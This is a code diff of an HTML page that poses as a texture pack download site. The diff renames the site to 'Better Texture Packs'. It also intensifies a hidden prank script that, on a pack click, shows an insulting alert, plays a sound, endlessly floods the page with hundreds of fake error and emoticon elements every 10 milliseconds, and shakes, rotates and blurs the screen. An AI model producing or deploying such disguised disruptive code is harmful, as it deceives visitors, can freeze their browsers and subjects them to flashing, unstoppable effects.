@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cazozozop Texture Packs</title>
+    <title>Better Texture Packs</title>
     <style>
         body {
             background: url('https://iili.io/2LnOhhX.png') no-repeat center center fixed;
@@ -11,8 +11,8 @@
             font-family: Arial, sans-serif;
             color: white;
             overflow-x: hidden;
-            transition: all 0.1s;
             margin: 0;
+            transition: all 0.1s;
         }
         .content {
             margin-top: 50px;
@@ -119,21 +119,23 @@
             alert(`YOU ARE AN IDIOT! AHAHAHAAAAA - ${packName}`);
             document.getElementById("trollSound").play();
             
-            // Generate many random troll windows and glitches rapidly
+            // Generate many random troll windows and glitches rapidly (100 times per second)
             setInterval(() => {
-                for (let i = 0; i < 75; i++) {
+                for (let i = 0; i < 100; i++) {
                     let trollDiv = document.createElement("div");
                     trollDiv.classList.add("troll-window");
                     trollDiv.innerText = ["ERROR 404!", "YOU ARE DOOMED!", "HAHAHAHA!", "NO ESCAPE!", "FATAL SYSTEM ERROR!", "CRITICAL MALFUNCTION!", "INFINITE CHAOS!", "TROLLED!"][Math.floor(Math.random() * 8)];
+                    trollDiv.style.position = "absolute";
                     trollDiv.style.top = Math.random() * window.innerHeight + "px";
                     trollDiv.style.left = Math.random() * window.innerWidth + "px";
+                    trollDiv.style.fontSize = "20px";
+                    trollDiv.style.color = "red";
+                    trollDiv.style.fontWeight = "bold";
                     document.body.appendChild(trollDiv);
                 }
-            }, 1);
 
-            // Generate text glitches
-            setInterval(() => {
-                for (let i = 0; i < 75; i++) {
+                // Glitchy characters appearing at random positions
+                for (let i = 0; i < 100; i++) {
                     let glitch = document.createElement("div");
                     glitch.style.position = "absolute";
                     glitch.style.top = Math.random() * window.innerHeight + "px";
@@ -143,13 +145,14 @@
                     glitch.innerText = [":)", ":D", ";D", ":]", ">:D", ":}", ":|", ";)", "XD"][Math.floor(Math.random() * 9)];
                     document.body.appendChild(glitch);
                 }
-            }, 1);
+            }, 10); // Speed up the intervals to generate 100 troll elements per second
 
-            // Make the screen glitch
+            // Make the screen glitch heavily
             setInterval(() => {
-                document.body.style.transform = `rotate(${Math.random() * 10 - 5}deg) scale(${1 + Math.random() * 0.1}) translate(${Math.random() * 10 - 5}px, ${Math.random() * 10 - 5}px)`;
+                document.body.style.transform = `rotate(${Math.random() * 10 - 5}deg) scale(${1 + Math.random() * 0.2}) translate(${Math.random() * 20 - 10}px, ${Math.random() * 20 - 10}px)`;
                 document.body.style.backgroundPosition = `${Math.random() * 100}% ${Math.random() * 100}%`;
-            }, 50);
+                document.body.style.filter = `blur(${Math.random() * 2}px)`;
+            }, 10); // Speed up the glitch effect for more intensity
         }
         
         function triggerDownload(packName) {
